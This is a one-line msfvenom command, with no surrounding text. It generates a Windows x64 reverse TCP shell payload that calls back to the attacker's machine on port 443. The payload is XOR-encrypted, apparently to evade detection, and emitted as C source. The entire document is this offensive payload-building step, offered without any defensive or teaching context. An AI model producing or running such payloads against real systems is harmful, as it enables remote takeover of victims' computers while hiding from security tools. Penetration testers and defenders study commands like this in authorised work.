msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 --encrypt xor --encrypt-key test -f c -o enc.c